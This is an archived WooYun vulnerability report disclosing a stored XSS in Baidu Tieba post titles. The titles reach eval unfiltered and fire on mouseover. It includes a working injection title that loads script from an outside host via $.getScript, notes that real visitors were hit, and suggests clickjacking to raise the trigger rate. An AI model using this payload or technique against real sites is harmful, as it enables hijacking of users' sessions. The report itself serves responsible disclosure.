{"id": 13868, "wybug_id": "wooyun-2013-018358", "wybug_title": "百度贴吧贴内一处Mouseover XSS利用", "wybug_corp": "百度", "wybug_author": "gainover", "wybug_date": "2013-02-04 16:47", "wybug_open_date": "2013-03-21 16:47", "wybug_type": "xss跨站脚本攻击", "wybug_level": "中", "wybug_rank_0": "10", "wybug_status": "厂商已经确认", "wybug_from": "http://www.wooyun.org", "wybug_tags": ["存储型"], "wybug_detail": "漏洞详情 披露状态：   \t\t\t\t\t\t\t\t\t2013-02-04：\t细节已通知厂商并且等待厂商处理中\t\t\t\t\t\t\t\t\t2013-02-04：\t厂商已经确认，细节仅向厂商公开\t\t\t\t\t\t\t\t\t2013-02-14：\t细节向核心白帽子及相关领域专家公开\t\t\t\t\t\t\t\t\t2013-02-24：\t细节向普通白帽子公开\t\t\t\t\t\t\t\t\t2013-03-06：\t细节向实习白帽子公开\t\t\t\t\t\t\t\t\t2013-03-21：\t细节向公众公开  简要描述： 贴内一处操作，对数据未过滤，导致产生一处XSS，需要鼠标从上面经过才能触发，可结合clickjacking之类的使用。 详细说明：  1. 由于在编写工具，测试hook eval的效果。在贴吧内发了一帖子。http://tieba.baidu.com/p/2045714993标题为：\"。。生蛋啦～ '2. 打开工具，对 “生蛋啦” 这三个字进行监视。\n\n3. 刷新页面，并没有发现什么结果，但是当鼠标不小心移动到【分享到】按钮时，报告了一个，如下图：\n\n4. 从上图，我们不难看出，【标题】被作为 data 属性存储，并且通过getAttribute的方式读取，未过滤就传入eval中执行。5. 这样一来，我们就很容易构造代码了。发表一帖子，标题如下：',a:$.getScript('//xsser.me/Bqp9Ry'),a:'即最后被传入eval的数据变为:被eval的数据({title:'分享到',wbuid:1673450172, text:'',a:$.getScript('//xsser.me/Bqp9Ry'),a:''})帖子地址：http://tieba.baidu.com/p/21349000966. 我自己的个人贴吧，没什么人访问。且要mouseover上去是有概率的，不过还是有中招的。\n\n7. 如果要增大这个的命中率， 可以做一个抽奖页面，搞个大按钮，然后把贴吧的页面 iframe 下，做个clickjacking。 当别人鼠标移到【抽奖】按钮上时，即可触发。具体代码不表。   漏洞证明：  如上。   修复方案：  缺陷代码部分：\nfunction (e){pos=base.getposition(a);custom=(b.getattribute(\"data\")&&b.getattribute(\"data\")!=\"\")?eval(\"(\"+b.getattribute(\"data\")+\")\"):\"\";base.setattr(p,\"display:\"+v);base.setattr(p,\"left:\"+(((base.getsize().w-e.clientx)<p.offsetwidth)?(pos.l-p.offsetwidth+a.offsetwidth):pos.l)+\"px\");base.setattr(p,\"top:\"+(((base.getsize().h-e.clienty)<p.offsetheight)?(pos.t-p.offsetheight):pos.t+a.offsetheight)+\"px\");base.setattr(m,\"display:\"+v+\";width:\"+p.offsetwidth+\"px;height:\"+p.offsetheight+\"px;left:\"+p.style.left+\";top:\"+p.style.top)}\n在eval之前，将b.getattribute(\"data\")的值判断过滤下？   版权声明：转载请注明来源 gainover@乌云\n ", "wybug_reply": "漏洞回应  厂商回应： 危害等级：中 漏洞Rank：7  确认时间：2013-02-04 17:35 厂商回复： 感谢你对百度安全的关注，我们马上安排处理！ 最新状态： 暂无  ", "replys": "漏洞评价：\n评论\n     2013-02-04 16:47 |    \t\t风萧萧  \t\t\t( 核心白帽子 |\t\t\t        Rank:1020 漏洞数:76        | 人这一辈子总要动真格的爱上什么人)\t\t \n  这才是二哥嘛    \n     2013-02-04 17:29 |    \t\t鬼魅羊羔 \t\t\t( 普通白帽子  |\t\t\t        Rank:299 漏洞数:42        | (#‵′)凸(#‵′)凸(#‵′)凸(#‵′)凸(#‵...)\t\t \n  二哥终于出现了。。。    \n     2013-02-04 18:51 |    \t\t心伤的瘦子 \t\t\t( 普通白帽子  |\t\t\t        Rank:147 漏洞数:21        | 严肃点~此号为虚拟小号，并不存在实体...)\t\t \n  二师兄，师傅被妖怪抓啦。    \n     2013-02-05 00:13 |    \t\t水滴 \t\t\t( 普通白帽子  |\t\t\t        Rank:146 漏洞数:24        )\t\t \n  图片？    \n     2013-02-05 19:33 |    \t\txsser  \t\t\t( 普通白帽子  |\t\t\t        Rank:254 漏洞数:18        | 当我又回首一切,这个世界会好吗?)\t\t \n  二哥是品牌保障啊 一发就有人关注    \n     2013-02-08 10:00 |    \t\t \t\t\t( 路人 |\t\t\t        Rank:17 漏洞数:3        | 博客寻友链 http://imlonghao.com/)\t\t \n  @xsser 你一发全社区都来信不信    \n     2013-02-08 17:55 |    \t\tPPFish \t\t\t( 路人 |\t\t\t        Rank:10 漏洞数:1        | 一株是枣树，另一株还是枣树。)\t\t \n  @gainover 求解 何为二哥     \n     2013-02-08 19:01 |    \t\tpx1624 \t\t\t( 普通白帽子  |\t\t\t        Rank:1036 漏洞数:175        | px1624)\t\t \n  @PPFish 二哥就是老二呗、、、    \n     2013-02-08 19:30 |    \t\t风萧萧  \t\t\t( 核心白帽子 |\t\t\t        Rank:1020 漏洞数:76        | 人这一辈子总要动真格的爱上什么人)\t\t \n  @xsser 乌云王来一个撒    \n     2013-03-18 09:55 |    \t\tcnn4ry \t\t\t( 路人 |\t\t\t        Rank:0 漏洞数:1        | :))\t\t \n  插件不错，求share!    \n     2013-03-18 10:50 |    \t\t小胖胖要减肥  \t\t\t( 普通白帽子  |\t\t\t        Rank:686 漏洞数:101        )\t\t \n  gainover 求chrme插件。。。。    \n     2013-03-21 17:04 |    \t\t杀戮 \t\t\t( 普通白帽子  |\t\t\t        Rank:141 漏洞数:19        | 我，是来打酱油的。)\t\t \n  @gainover 哥的关注量相当大    \n     2013-03-22 09:29 |    \t\twefgod \t\t\t( 普通白帽子  |\t\t\t        Rank:1807 漏洞数:179        | 力不从心)\t\t \n  大牛就是大牛啊    \n  \n\n\n", "wybug_level_fromcorp": "中", "wybug_rank_fromcorp": 7, "Ranks": null}